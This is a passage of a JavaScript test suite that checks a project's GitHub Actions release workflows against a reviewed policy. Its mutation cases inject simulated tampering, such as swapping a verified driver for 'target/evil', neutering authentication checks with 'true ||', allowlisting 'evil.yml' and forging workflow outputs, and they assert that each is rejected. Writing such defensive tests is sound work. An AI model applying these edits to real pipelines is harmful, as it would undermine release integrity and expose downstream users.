    ["Linux calibration repeats Cargo build", "linux-vulkan-proof.yml", workflow => {
      linuxNativeBuild(workflow).run += "\ncargo build --release --locked -p codestory-bench";
    }, /prepare once, build CLI and collector once, and package that exact CLI once/u],
    ["Linux calibration repeats packaging", "linux-vulkan-proof.yml", workflow => {
      linuxNativeBuild(workflow).run += "\npython .github/scripts/package-codestory-release.py --version 0.0.0";
    }, /prepare once, build CLI and collector once, and package that exact CLI once/u],
    ["Linux calibration omits the runtime binary", "linux-vulkan-proof.yml", workflow => {
      linuxNativeBuild(workflow).run = linuxNativeBuild(workflow).run.replace(
        "--bin codestory-cli-runtime",
        "",
      );
    }, /prepare once, build CLI and collector once, and package that exact CLI once/u],
    ["Linux calibration repeats model preparation", "linux-vulkan-proof.yml", workflow => {
      workflow.jobs["optional-constant-calibration"].steps.push({
        name: "Prepare model again",
        run: "node scripts/prepare-embedded-model.mjs",
      });
    }, /prepare once, build CLI and collector once, and package that exact CLI once/u],
    ["assembly waits for Linux", coordinatorFile, workflow => {
      assembly(workflow).needs.push("calibration-linux");
    }, /wait only for required protected macOS Metal evidence/u],
    ["assembly condition waits for Linux", coordinatorFile, workflow => {
      assembly(workflow).if += " && needs.calibration-linux.result == 'success'";
    }, /wait only for required protected macOS Metal evidence/u],
    ["assembly condition waits on an optional Vulkan variable", coordinatorFile, workflow => {
      assembly(workflow).if += " && vars.OPTIONAL_VULKAN_READY == 'true'";
    }, /wait only for required protected macOS Metal evidence/u],
    ["assembly downloads Linux evidence", coordinatorFile, workflow => {
      assembly(workflow).steps.splice(1, 0, {
        name: "Download optional Linux evidence",
        uses: "actions/download-artifact@v8.0.1",
        with: {
          name: "optional-embedding-calibration-linux-vulkan",
          path: "target/calibration-inputs/linux",
        },
      });
    }, /must not select, discover, or gate on Linux evidence/u],
    ["assembly requires wildcard optional evidence", coordinatorFile, workflow => {
      assembly(workflow).steps.splice(2, 0, {
        name: "Download auxiliary calibration evidence",
        uses: "actions/download-artifact@v8.0.1",
        with: {
          pattern: "optional-embedding-calibration-*",
          path: "target/auxiliary-calibration",
        },
      }, {
        name: "Require auxiliary calibration evidence",
        shell: "bash",
        run: 'test "$(find target/auxiliary-calibration -type f | wc -l | tr -d " ")" -gt 0',
      });
    }, /exact protected macOS-only step boundary/u],
    ["assembly can overwrite required runs with wildcard evidence", coordinatorFile, workflow => {
      assembly(workflow).steps.splice(2, 0, {
        name: "Download auxiliary calibration evidence",
        uses: "actions/download-artifact@v8.0.1",
        with: {
          pattern: "optional-embedding-calibration-*",
          path: "target/auxiliary-calibration",
        },
      }, {
        name: "Select auxiliary calibration evidence",
        shell: "bash",
        run: [
          'test "$(find target/auxiliary-calibration -name "run-*.json" | wc -l | tr -d " ")" = 3',
          'find target/auxiliary-calibration -name "run-*.json" -exec cp {} target/calibration-inputs/macos/ \\;',
        ].join("\n"),
      });
    }, /exact protected macOS-only step boundary/u],
    ["assembly broadens artifact discovery", coordinatorFile, workflow => {
      assemblyStep(workflow).run = assemblyStep(workflow).run
        .replace("find target/calibration-inputs/macos", "find target/calibration-inputs");
    }, /must not select, discover, or gate on Linux evidence/u],
    ["assembly accepts six records", coordinatorFile, workflow => {
      assemblyStep(workflow).run = assemblyStep(workflow).run
        .replace('test "${#runs[@]}" = 3', 'test "${#runs[@]}" = 6');
    }, /step Assemble frozen calibration candidate must run test "\$\{#runs\[@\]\}" = 3/u],
    ["assembly accepts two matrix cells", coordinatorFile, workflow => {
      assemblyStep(workflow).run = assemblyStep(workflow).run
        .replace(".matrix_cell_count == 1", ".matrix_cell_count == 2");
    }, /step Assemble frozen calibration candidate must run \.matrix_cell_count == 1/u],
    ["an extra Linux hardware job can keep calibration from completing", coordinatorFile, workflow => {
      workflow.jobs["hidden-linux-calibration-wait"] = {
        needs: "route",
        if: "needs.route.outputs.mode == 'calibration'",
        "runs-on": ["self-hosted", "Linux", "X64", "codestory-vulkan"],
        "timeout-minutes": 360,
        steps: [{ name: "Wait on optional Linux", run: "true" }],
      };
    }, /must retain the reviewed exact job set so no hidden hardware job can block calibration/u],
  ];
  for (const [name, file, mutate, expected] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      assert.match(validateWorkflows(workflows).join("\n"), expected);
    });
  }
});

test("frozen-candidate qualification keeps the Metal quality handoff and optional Linux topology", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const coordinatorFile = "packaged-platform-pr.yml";
  const metalFile = "macos-metal-proof.yml";
  const windowsFile = "windows-vulkan-proof.yml";
  const linuxFile = "linux-vulkan-proof.yml";

  const mutations = [
    ["qualification route accepts no calibration artifact", coordinatorFile, workflow => {
      const resolver = draftStep(workflow.jobs.route, "Resolve trusted exact head");
      resolver.run = resolver.run.replace(
        'test -n "$INPUT_CALIBRATION_ARTIFACT"',
        'true "$INPUT_CALIBRATION_ARTIFACT"',
      );
    }, /Resolve trusted exact head must run test -n "\$INPUT_CALIBRATION_ARTIFACT"|exact normalized trusted resolver/u],
    ["Metal qualification becomes candidate-installed only", coordinatorFile, workflow => {
      workflow.jobs["macos-metal-proof"].with.candidate_installed_proof = true;
    }, /qualification must run full Metal proof rather than candidate-installed proof/u],
    ["Metal qualification becomes server-behavior only", coordinatorFile, workflow => {
      workflow.jobs["macos-metal-proof"].with.server_behavior_only = true;
    }, /qualification must run full Metal quality and lifecycle proof/u],
    ["Windows no longer waits for Metal", coordinatorFile, workflow => {
      workflow.jobs["windows-vulkan-proof"].needs
        = workflow.jobs["windows-vulkan-proof"].needs
          .filter(name => name !== "macos-metal-proof");
    }, /Windows qualification must wait for successful protected Metal quality/u],
    ["Windows ignores failed Metal qualification", coordinatorFile, workflow => {
      workflow.jobs["windows-vulkan-proof"].if
        = workflow.jobs["windows-vulkan-proof"].if.replace(
          "(needs.route.outputs.mode != 'qualification' || needs.macos-metal-proof.result == 'success') &&",
          "",
        );
    }, /qualification requires successful Metal/u],
    ["Windows qualification loses exact quality artifact", coordinatorFile, workflow => {
      workflow.jobs["windows-vulkan-proof"].with.quality_evidence_artifact = "";
    }, /must consume the exact protected Metal quality artifact/u],
    ["Windows qualification becomes candidate-installed only", coordinatorFile, workflow => {
      workflow.jobs["windows-vulkan-proof"].with.candidate_installed_proof = true;
    }, /qualification must run full Windows proof rather than candidate-installed proof/u],
    ["Windows qualification becomes server-behavior only", coordinatorFile, workflow => {
      workflow.jobs["windows-vulkan-proof"].with.server_behavior_only = true;
    }, /qualification must run full Windows lifecycle and fault proof/u],
    ["coordinator schedules Linux during qualification", coordinatorFile, workflow => {
      workflow.jobs["linux-vulkan-proof"].if
        = workflow.jobs["linux-vulkan-proof"].if.replace(
          "needs.route.outputs.mode != 'qualification' &&",
          "",
        );
    }, /qualification modes must skip coordinator Linux proof/u],
    ["qualification closeout blocks on Linux", coordinatorFile, workflow => {
      const closeout = draftStep(
        workflow.jobs.closeout,
        "Require one coherent accepted proof",
      );
      closeout.run = closeout.run.replace(
        `if [ "$MODE" = qualification ]; then
      require_result "$LINUX_VULKAN_RESULT" skipped linux-vulkan-proof
    else`,
        `if [ "$MODE" = qualification ]; then
      require_result "$LINUX_VULKAN_RESULT" success linux-vulkan-proof
    else`,
      );
    }, /qualification closeout must accept skipped optional Linux proof without blocking/u],
    ["qualification closeout hides the accepted Linux branch in dead code", coordinatorFile, workflow => {
      const closeout = draftStep(
        workflow.jobs.closeout,
        "Require one coherent accepted proof",
      );
      const accepted = `if [ "$MODE" = qualification ]; then
      require_result "$LINUX_VULKAN_RESULT" skipped linux-vulkan-proof
    else
      require_result "$LINUX_VULKAN_RESULT" success linux-vulkan-proof
    fi`;
      closeout.run = closeout.run.replace(
        accepted,
        accepted.replace(
          'require_result "$LINUX_VULKAN_RESULT" skipped linux-vulkan-proof',
          'require_result "$LINUX_VULKAN_RESULT" success linux-vulkan-proof',
        ),
      );
      closeout.run += `\nif false; then\n${accepted}\nfi\n`;
    }, /must match the reviewed coordinator closeout script exactly/u],
    ["qualification closeout job is disabled", coordinatorFile, workflow => {
      workflow.jobs.closeout.if = "${{ always() && false }}";
    }, /closeout job must retain its reviewed unconditional result-checking activation/u],
    ["qualification closeout proof step is disabled", coordinatorFile, workflow => {
      draftStep(
        workflow.jobs.closeout,
        "Require one coherent accepted proof",
      ).if = "${{ false }}";
    }, /closeout must run one unconditional proof step under the reviewed Bash interpreter/u],
    ["qualification closeout shell ignores the reviewed script", coordinatorFile, workflow => {
      draftStep(
        workflow.jobs.closeout,
        "Require one coherent accepted proof",
      ).shell = "bash -c 'true' {0}";
    }, /closeout must run one unconditional proof step under the reviewed Bash interpreter/u],
    ["qualification closeout mode is rebound away from the route", coordinatorFile, workflow => {
      draftStep(
        workflow.jobs.closeout,
        "Require one coherent accepted proof",
      ).env.MODE = "qualification ";
    }, /closeout proof must bind every route and platform result from the reviewed jobs exactly/u],
    ["Metal quality producer runs during calibration", metalFile, workflow => {
      draftStep(
        workflow.jobs["packaged-metal"],
        "Produce exact-head holdout quality on protected Metal",
      ).if = "${{ !inputs.server_behavior_only }}";
    }, /must generate one exact-head three-repeat holdout quality artifact/u],
    ["Metal quality producer weakens repeat contract", metalFile, workflow => {
      const producer = draftStep(
        workflow.jobs["packaged-metal"],
        "Produce exact-head holdout quality on protected Metal",
      );
      producer.run = producer.run.replace("--repeats 3", "--repeats 1");
    }, /must generate one exact-head three-repeat holdout quality artifact/u],
    ["Metal quality upload loses exact-head name", metalFile, workflow => {
      draftStep(
        workflow.jobs["packaged-metal"],
        "Upload exact-head protected Metal quality evidence",
      ).with.name = "frozen-candidate-quality";
    }, /must upload one exact-head stable handoff/u],
    ["Metal quality upload loses safe overwrite", metalFile, workflow => {
      draftStep(
        workflow.jobs["packaged-metal"],
        "Upload exact-head protected Metal quality evidence",
      ).with.overwrite = false;
    }, /must upload one exact-head stable handoff/u],
    ["Windows downloads an unrelated quality artifact", windowsFile, workflow => {
      draftStep(
        workflow.jobs["packaged-vulkan"],
        "Download exact-head publishable packet quality evidence",
      ).with.name = "latest-quality";
    }, /must download the exact protected Metal quality handoff/u],
    ["Linux full qualification skips retained-driver verification", linuxFile, workflow => {
      draftStep(
        workflow.jobs["packaged-vulkan"],
        "Verify packaged qualification driver",
      ).if = "${{ inputs.server_behavior_only }}";
    }, /packaged qualification must verify the archive-bound private driver/u],
    ["Linux trusts quality from another workflow", linuxFile, workflow => {
      const authenticate = draftStep(
        workflow.jobs["packaged-vulkan"],
        "Authenticate protected Metal quality producer",
      );
      authenticate.run = authenticate.run.replace(
        ".github/workflows/packaged-platform-pr.yml",
        ".github/workflows/release.yml",
      );
    }, /must authenticate exact-head protected Metal quality/u],
    ["Linux quality download loses producer run identity", linuxFile, workflow => {
      draftStep(
        workflow.jobs["packaged-vulkan"],
        "Download exact-head protected Metal quality evidence",
      ).with["run-id"] = "${{ github.run_id }}";
    }, /must consume the authenticated protected Metal quality artifact/u],
    ["Linux standalone path removes lifecycle qualification", linuxFile, workflow => {
      const proof = draftStep(
        workflow.jobs["packaged-vulkan"],
        "Prove offline Linux Vulkan retrieval",
      );
      proof.run = proof.run.replace("--produce-qualification-evidence", "--server-behavior-only");
    }, /standalone qualification runs one full lifecycle and quality proof/u],
  ];

  for (const [name, file, mutate, expected] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      assert.match(validateWorkflows(workflows).join("\n"), expected);
    });
  }

  for (const [name, mutate] of [
    ["required Windows qualification cell becomes optional", graph => {
      graph.workflow_policy.qualification.required_cells
        = graph.workflow_policy.qualification.required_cells.slice(0, 1);
    }],
    ["quality producer moves off protected Metal", graph => {
      graph.workflow_policy.qualification.quality_contract.producer_cell
        = "protected_windows_x64_vulkan";
    }],
    ["true-idle grace replaces the product timeout", graph => {
      graph.workflow_policy.qualification.true_idle_timeout_ms = 2_500;
    }],
  ]) {
    await t.test(`claim graph: ${name}`, () => {
      const graph = structuredClone(loadReleaseClaimGraph(root));
      mutate(graph);
      assert.match(
        validateWorkflows(loadWorkflows(), graph).join("\n"),
        /must implement the release claim graph qualification contract/u,
      );
    });
  }
});

test("qualification driver is built once, retained privately, authenticated, and reused", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const packagedFile = "packaged-platform-proof.yml";
  const coordinatorFile = "packaged-platform-pr.yml";
  const metalFile = "macos-metal-proof.yml";
  const windowsFile = "windows-vulkan-proof.yml";
  const linuxFile = "linux-vulkan-proof.yml";
  const packagedJob = workflow => workflow.jobs.build;
  const hostBuild = workflow => draftStep(
    packagedJob(workflow),
    "Build package and qualification driver",
  );
  const linuxBuild = workflow => draftStep(
    packagedJob(workflow),
    "Build Linux x64 at the glibc 2.31 baseline",
  );
  const stage = workflow => draftStep(
    packagedJob(workflow),
    "Stage qualification driver in package proof artifact",
  );
  const metalJob = workflow => workflow.jobs["packaged-metal"];
  const windowsJob = workflow => workflow.jobs["packaged-vulkan"];
  const linuxJob = workflow => workflow.jobs["packaged-vulkan"];

  const mutations = [
    ["driver retention defaults on", packagedFile, workflow => {
      workflow.on.workflow_call.inputs.include_qualification_driver.default = true;
    }, /private qualification-driver retention must be explicit and off by default/u],
    ["host package repeats Cargo build", packagedFile, workflow => {
      hostBuild(workflow).run += '\ncargo build --release --locked "${cargo_args[@]}"';
    }, /host package must build CLI, runtime, and conditional qualification driver in one exact Cargo invocation/u],
    ["host package drops runtime", packagedFile, workflow => {
      hostBuild(workflow).run = hostBuild(workflow).run.replace(
        "--bin codestory-cli-runtime",
        "--bin ignored-runtime",
      );
    }, /host package must build CLI, runtime, and conditional qualification driver in one exact Cargo invocation/u],
    ["host package broadens to all bins", packagedFile, workflow => {
      hostBuild(workflow).run = hostBuild(workflow).run.replace(
        "--bin codestory-cli-runtime",
        "--bins",
      );
    }, /host package must build CLI, runtime, and conditional qualification driver in one exact Cargo invocation/u],
    ["host package substitutes calibration driver", packagedFile, workflow => {
      hostBuild(workflow).run = hostBuild(workflow).run.replace(
        "codestory_embedding_qualification",
        "codestory_embedding_constant_calibration",
      );
    }, /host package must build CLI, runtime, and conditional qualification driver in one exact Cargo invocation/u],
    ["Linux package repeats Cargo build", packagedFile, workflow => {
      linuxBuild(workflow).run = linuxBuild(workflow).run.replace(
        "/sccache/sccache --show-stats",
        'cargo build --release --locked "$@" --target "$RELEASE_RUST_TARGET"\n              /sccache/sccache --show-stats',
      );
    }, /Linux package must build CLI, runtime, and conditional qualification driver in one exact Cargo invocation/u],
    ["qualification driver cache identity becomes fixed", packagedFile, workflow => {
      draftStep(
        packagedJob(workflow),
        "Capture reusable build cache contract",
      ).env.INCLUDE_QUALIFICATION_DRIVER = "false";
    }, /must compute one complete reusable compiler compatibility contract/u],
    ["coordinator retains driver for every package", coordinatorFile, workflow => {
      workflow.jobs["packaged-proof"].with.include_qualification_driver = true;
    }, /retain the private qualification driver only for frozen-candidate qualification/u],
    ["coordinator stops retaining qualification driver", coordinatorFile, workflow => {
      workflow.jobs["packaged-proof"].with.include_qualification_driver = false;
    }, /retain the private qualification driver only for frozen-candidate qualification/u],
    ["driver staging becomes unconditional", packagedFile, workflow => {
      stage(workflow).if = "always()";
    }, /retain one archive-bound private qualification driver beside each selected package/u],
    ["driver staging binds a decoy archive", packagedFile, workflow => {
      stage(workflow).run = stage(workflow).run.replace(
        "--archive \"target/release-dist/codestory-cli-v${INPUT_VERSION}-${{ matrix.asset_target }}.${{ matrix.extension }}\"",
        "--archive target/release-dist/decoy.tar.gz",
      );
    }, /retain one archive-bound private qualification driver beside each selected package/u],
    ["driver staging trusts the Windows target junction", packagedFile, workflow => {
      stage(workflow).run = stage(workflow).run.replace(
        "--target-dir target",
        '--target-dir "${CARGO_TARGET_DIR:-target}"',
      );
    }, /retain one archive-bound private qualification driver beside each selected package/u],
    ["package artifact drops private driver directory", packagedFile, workflow => {
      const upload = draftStep(packagedJob(workflow), "Upload release asset");
      upload.with.path = upload.with.path.replace(
        "target/release-dist/qualification-driver/${{ matrix.asset_target }}\n",
        "",
      );
    }, /existing package artifact must retain the private driver directory/u],
    ["public archive includes qualification driver", packagedFile, workflow => {
      draftStep(packagedJob(workflow), "Package release asset").run +=
        "\ntar -rf \"$archive\" target/release-dist/qualification-driver";
    }, /public archives and signing inputs must exclude the private qualification driver/u],
    ["GitHub release publishes private qualification driver", "release.yml", workflow => {
      draftStep(workflow.jobs.publish, "Create GitHub release").run =
        draftStep(workflow.jobs.publish, "Create GitHub release").run.replace(
          'gh release create "$TAG" "${assets[@]}"',
          'gh release create "$TAG" "${assets[@]}" target/release-assets/qualification-driver',
        );
    }, /publish only graph-declared root assets and exclude the private qualification driver/u],
    ["Metal verifier reads a decoy archive", metalFile, workflow => {
      const verify = draftStep(
        metalJob(workflow),
        "Verify packaged qualification driver",
      );
      verify.run = verify.run.replace(
        "codestory-cli-v${version}-macos-arm64.tar.gz",
        "decoy-macos.tar.gz",
      );
    }, /packaged qualification must verify the archive-bound private driver/u],
    ["Metal verifier output is not retained", metalFile, workflow => {
      draftStep(
        metalJob(workflow),
        "Verify packaged qualification driver",
      ).run = "node .github/scripts/qualification-driver-artifact.mjs verify";
    }, /packaged qualification must verify the archive-bound private driver/u],
    ["Metal verifier becomes advisory with a forged fallback", metalFile, workflow => {
      const verify = draftStep(
        metalJob(workflow),
        "Verify packaged qualification driver",
      );
      verify.run = verify.run.replace(
        "set -euo pipefail",
        "set +e",
      );
      verify.run +=
        "\nset -e\nprintf 'path=target/evil\\n' >> \"$GITHUB_OUTPUT\"";
    }, /reviewed protected Metal workflow structure/u],
    ["Metal substitutes driver after verification", metalFile, workflow => {
      const steps = metalJob(workflow).steps;
      const verifyIndex = steps.findIndex(
        step => step.name === "Verify packaged qualification driver",
      );
      steps.splice(verifyIndex + 1, 0, {
        name: "Replace retained driver",
        shell: "bash",
        run: "cp target/evil target/release-dist/qualification-driver/macos-arm64/codestory_embedding_qualification",
      });
    }, /must not replace the verified qualification driver before execution/u],
    ["Metal executes a different driver", metalFile, workflow => {
      draftStep(metalJob(workflow), "Prove protected Metal runtime").run =
        draftStep(metalJob(workflow), "Prove protected Metal runtime").run
          .replace(
            '--qualification-driver "$qualification_driver"',
            "--qualification-driver target/release/other-driver",
          );
    }, /server-behavior proof must omit calibration while qualification retains it/u],
    ["Metal packaged qualification reinstalls Rust", metalFile, workflow => {
      draftStep(metalJob(workflow), "Install pinned Rust").if =
        "${{ !inputs.use_packaged_cli_artifact || !inputs.server_behavior_only }}";
    }, /every packaged proof must skip Rust installation/u],
    ["Metal rebuilds driver after download", metalFile, workflow => {
      metalJob(workflow).steps.push({
        name: "Build qualification driver",
        if: "${{ !inputs.server_behavior_only }}",
        shell: "bash",
        run: "cargo build --release --locked -p codestory-bench --bin codestory_embedding_qualification",
      });
    }, /must not rebuild the qualification driver after package download/u],
    ["Metal calibration also builds qualification driver", metalFile, workflow => {
      const build = draftStep(metalJob(workflow), "Build and package native CLI");
      build.run = build.run.replace(
        'elif [ "$SERVER_BEHAVIOR_ONLY" != true ]; then',
        'if [ "$SERVER_BEHAVIOR_ONLY" != true ]; then',
      );
    }, /calibration must build CLI and constant collector once through one shared Cargo invocation/u],
    ["Windows trusts an arbitrary producer workflow", windowsFile, workflow => {
      const authenticate = draftStep(
        windowsJob(workflow),
        "Authenticate exact Windows package producer",
      );
      authenticate.run = authenticate.run.replace(
        '$env:CANDIDATE_PRODUCER_WORKFLOW_PATH -notin $allowedWorkflows',
        "$false",
      );
    }, /authenticate one exact-head package from an allowlisted producer/u],
    ["Windows executes an unverified driver", windowsFile, workflow => {
      draftStep(windowsJob(workflow), "Prove protected Windows Vulkan runtime")
        .env.VERIFIED_QUALIFICATION_DRIVER = "target/release/other.exe";
    }, /server-behavior proof must omit calibration while qualification runs one full lifecycle/u],
    ["Windows substitutes driver after verification", windowsFile, workflow => {
      const steps = windowsJob(workflow).steps;
      const verifyIndex = steps.findIndex(
        step => step.name === "Verify packaged qualification driver",
      );
      steps.splice(verifyIndex + 1, 0, {
        name: "Replace retained driver",
        shell: "powershell",
        run: "Copy-Item target/evil.exe target/release-dist/qualification-driver/windows-x64/codestory_embedding_qualification.exe",
      });
    }, /must not replace the verified qualification driver before execution/u],
    ["Windows rebuilds driver after download", windowsFile, workflow => {
      windowsJob(workflow).steps.push({
        name: "Build qualification driver",
        shell: "powershell",
        run: "cargo build --release --locked -p codestory-bench --bin codestory_embedding_qualification",
      });
    }, /must not rebuild the qualification driver after package download/u],
    ["Linux trusts an arbitrary producer workflow", linuxFile, workflow => {
      const authenticate = draftStep(
        linuxJob(workflow),
        "Authenticate exact Linux package producer",
      );
      authenticate.run = authenticate.run.replace(
        'case "$CANDIDATE_PRODUCER_WORKFLOW_PATH" in',
        'case ".github/workflows/packaged-platform-pr.yml" in',
      );
    }, /authenticate one exact-head package from an allowlisted producer/u],
    ["Linux allowlist admits an untrusted producer through dead checks", linuxFile, workflow => {
      const authenticate = draftStep(
        linuxJob(workflow),
        "Authenticate exact Linux package producer",
      );
      authenticate.run = authenticate.run.replace(
        ".github/workflows/packaged-platform-pr.yml)",
        ".github/workflows/packaged-platform-pr.yml | .github/workflows/evil.yml)",
      );
      authenticate.run = authenticate.run.replace(
        'test "$CANDIDATE_PRODUCER_WORKFLOW_PATH" = \\\n              .github/workflows/packaged-platform-pr.yml',
        'true || test "$CANDIDATE_PRODUCER_WORKFLOW_PATH" = \\\n              .github/workflows/packaged-platform-pr.yml',
      );
    }, /reviewed protected Linux Vulkan workflow structure/u],
    ["Linux producer path equality becomes advisory", linuxFile, workflow => {
      const authenticate = draftStep(
        linuxJob(workflow),
        "Authenticate exact Linux package producer",
      );
      authenticate.run = authenticate.run.replace(
        'test "$(jq -r \'.path\' <<<"$run")" = "$CANDIDATE_PRODUCER_WORKFLOW_PATH"',
        'true || test "$(jq -r \'.path\' <<<"$run")" = "$CANDIDATE_PRODUCER_WORKFLOW_PATH"',
      );
    }, /reviewed protected Linux Vulkan workflow structure/u],
    ["Linux accepts an incomplete external package run", linuxFile, workflow => {
      const authenticate = draftStep(
        linuxJob(workflow),
        "Authenticate exact Linux package producer",
      );
      authenticate.run = authenticate.run.replace(
        'test "$(jq -r \'.conclusion\' <<<"$run")" = success',
        "true",
      );
    }, /authenticate one exact-head package from an allowlisted producer/u],
    ["Linux accepts a package artifact from another head", linuxFile, workflow => {
      const authenticate = draftStep(
        linuxJob(workflow),
        "Authenticate exact Linux package producer",
      );
      authenticate.run = authenticate.run.replace(
        "and .workflow_run.head_sha == $sha",
        "",
      );
    }, /authenticate one exact-head package from an allowlisted producer/u],
    ["Linux executes a hardcoded driver", linuxFile, workflow => {
      draftStep(linuxJob(workflow), "Prove offline Linux Vulkan retrieval").run =
        draftStep(linuxJob(workflow), "Prove offline Linux Vulkan retrieval").run
          .replace(
            '--qualification-driver "$qualification_driver"',
            "--qualification-driver target/release/other-driver",
          );
    }, /standalone qualification runs one full lifecycle and quality proof/u],
    ["Linux substitutes driver after verification", linuxFile, workflow => {
      const steps = linuxJob(workflow).steps;
      const verifyIndex = steps.findIndex(
        step => step.name === "Verify packaged qualification driver",
      );
      steps.splice(verifyIndex + 1, 0, {
        name: "Replace retained driver",
        shell: "bash",
        run: "cp target/evil target/release-dist/qualification-driver/linux-x64/codestory_embedding_qualification",
      });
    }, /must not replace the verified qualification driver before execution/u],
    ["Linux rebuilds driver after download", linuxFile, workflow => {
      linuxJob(workflow).steps.push({
        name: "Build qualification driver",
        shell: "bash",
        run: "cargo build --release --locked -p codestory-bench --bin codestory_embedding_qualification",
      });
    }, /must not reinstall Rust, prepare a model, or rebuild the retained driver/u],
  ];

  for (const [name, file, mutate, expected] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      assert.match(validateWorkflows(workflows).join("\n"), expected);
    });
  }

  const helperSource = readFileSync(
    path.join(root, ".github/scripts/qualification-driver-artifact.mjs"),
    "utf8",
  );
  for (const [name, mutate] of [
    ["helper stops hashing the candidate archive", source =>
      source.replace("sha256(archivePath) !== identity.archive.sha256", "false")],
    ["helper follows linked path ancestors", source =>
      source.replace("lstatSync(cursor).isSymbolicLink()", "false")],
    ["helper accepts hardlinked retained drivers", source =>
      source.replace("metadata.nlink !== 1", "false")],
    ["helper accepts extra identity fields", source =>
      source.replace('fail(`${label} keys changed`)', "return")],
    ["helper accepts unknown flags", source =>
      source.replace("requireExactFlags(values, [...commonFlags, \"--artifact-dir\"])", "true")],
    ["helper verifies one driver and returns another", source =>
      source.replace("return { driver, identity, identityPath };", "return { driver: archivePath, identity, identityPath };")],
  ]) {
    await t.test(name, () => {
      assert.match(
        qualificationDriverArtifactViolations(
          mutate(helperSource),
          loadReleaseClaimGraph(root),
        ).join("\n"),
        /must match the reviewed archive-bound producer and verifier contract/u,
      );
    });
  }

  for (const [name, mutate] of [
    ["claim graph publishes driver", graph => {
      graph.workflow_policy.qualification.driver_contract.public_release_asset = true;
    }],
    ["claim graph drops archive digest", graph => {
      graph.workflow_policy.qualification.driver_contract.identity_fields =
        graph.workflow_policy.qualification.driver_contract.identity_fields
          .filter(field => field !== "archive.sha256");
    }],
    ["claim graph allows repeated builds", graph => {
      graph.workflow_policy.qualification.driver_contract
        .build_invocations_per_platform = 2;
    }],
  ]) {
    await t.test(`claim graph: ${name}`, () => {
      const graph = structuredClone(loadReleaseClaimGraph(root));
      mutate(graph);
      assert.match(
        validateWorkflows(loadWorkflows(), graph).join("\n"),
        /private archive-qualified driver contract exactly|release claim graph qualification contract/u,
      );
    });
  }
});

test("qualification driver retention breaks a Cargo source hardlink and rejects retained hardlinks", () => {
  const directory = mkdtempSync(
    path.join(os.tmpdir(), "codestory-qualification-driver-"),
  );
  try {
    const targetDirectory = path.join(directory, "target");
    const releaseDirectory = path.join(
      targetDirectory,
      "x86_64-pc-windows-msvc",
      "release",
    );
    const depsDirectory = path.join(releaseDirectory, "deps");
    mkdirSync(depsDirectory, { recursive: true });
    const originalDriver = path.join(
      depsDirectory,
      "codestory_embedding_qualification-hash.exe",
    );
    const cargoDriver = path.join(
      releaseDirectory,
      "codestory_embedding_qualification.exe",
    );
    writeFileSync(originalDriver, "qualification-driver-v1");
    chmodSync(originalDriver, 0o755);
    linkSync(originalDriver, cargoDriver);
    assert.equal(lstatSync(cargoDriver).nlink, 2);

    const archive = path.join(
      directory,
      "codestory-cli-v0.16.3-windows-x64.zip",
    );
    writeFileSync(archive, "candidate-archive");
    const artifactDirectory = path.join(directory, "artifact");
    const produced = produceQualificationDriverArtifact({
      archive,
      assetTarget: "windows-x64",
      outDir: artifactDirectory,
      sourceSha: "a".repeat(40),
      sourceTree: "b".repeat(40),
      targetDir: targetDirectory,
      trustedRoot: directory,
      version: "0.16.3",
    });
    assert.equal(lstatSync(produced.driver).nlink, 1);
    assert.equal(readFileSync(produced.driver, "utf8"), "qualification-driver-v1");

    writeFileSync(originalDriver, "qualification-driver-v2");
    assert.equal(readFileSync(produced.driver, "utf8"), "qualification-driver-v1");
    const verified = verifyQualificationDriverArtifact({
      archive,
      artifactDir: artifactDirectory,
      assetTarget: "windows-x64",
      sourceSha: "a".repeat(40),
      sourceTree: "b".repeat(40),
      trustedRoot: directory,
      version: "0.16.3",
    });
    assert.equal(verified.identity.driver.sha256, produced.identity.driver.sha256);

    linkSync(produced.driver, path.join(directory, "retained-driver-alias.exe"));
    assert.throws(
      () => verifyQualificationDriverArtifact({
        archive,
        artifactDir: artifactDirectory,
        assetTarget: "windows-x64",
        sourceSha: "a".repeat(40),
        sourceTree: "b".repeat(40),
        trustedRoot: directory,
        version: "0.16.3",
      }),
      /qualification driver artifact must be a regular, non-symlink, singly linked file/u,
    );
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
});

test("release workflows retain the closeout coordinator contract test", () => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  for (const [file, jobName] of [
    ["plugin-static.yml", "plugin-static"],
    ["release.yml", "workflow-policy"],
  ]) {
    const workflows = loadWorkflows();
    const step = workflows.get(file).jobs[jobName].steps.find(
      ({ name }) => name === "Check release claim and evidence contracts",
    );
    step.run = step.run.replace("scripts/tests/codestory-release-closeout.test.mjs", "");
    assert.ok(
      validateWorkflows(workflows).some((message) =>
        message.includes(file)
          && message.includes("scripts/tests/codestory-release-closeout.test.mjs")),
    );
  }
});

test("workflow hygiene requires declared permissions and step-job timeouts", () => {
  const valid = parseWorkflow(`
on: { workflow_dispatch: null }
permissions: { contents: read }
jobs:
  work:
    timeout-minutes: 5
    steps:
      - run: echo ok
  call:
    uses: ./.github/workflows/other.yml
`);
  assert.deepEqual(basicWorkflowViolations("fixture.yml", valid), []);

  const withoutPermissions = structuredClone(valid);
  delete withoutPermissions.permissions;
  assert.match(
    basicWorkflowViolations("fixture.yml", withoutPermissions).join("\n"),
    /must declare a top-level permissions block/u,
  );

  const withoutTimeout = structuredClone(valid);
  delete withoutTimeout.jobs.work["timeout-minutes"];
  assert.match(
    basicWorkflowViolations("fixture.yml", withoutTimeout).join("\n"),
    /jobs\.work must declare timeout-minutes/u,
  );
});

test("cargo test filters must select at least one real test", () => {
  const identifiers = new Map([["demo-crate", "/unused"]]);
  const known = new Set(["tests", "demo_tests", "full_publication_survives_restart"]);
  const originalReaddir = known;
  const workflows = new Map([
    [
      "fixture.yml",
      parseWorkflow(`
on: { workflow_dispatch: null }
permissions: { contents: read }
jobs:
  proof:
    timeout-minutes: 5
    steps:
      - run: |
          cargo test --locked -p demo-crate --lib publication_survives
          cargo test --locked -p demo-crate --lib -- --exact tests::demo_tests::full_publication_survives_restart
          cargo test --locked -p demo-crate --target \${{ matrix.rust_target }} --lib tests
          cargo test --locked -p demo-crate --lib publication_survives -- --test-threads 1
`),
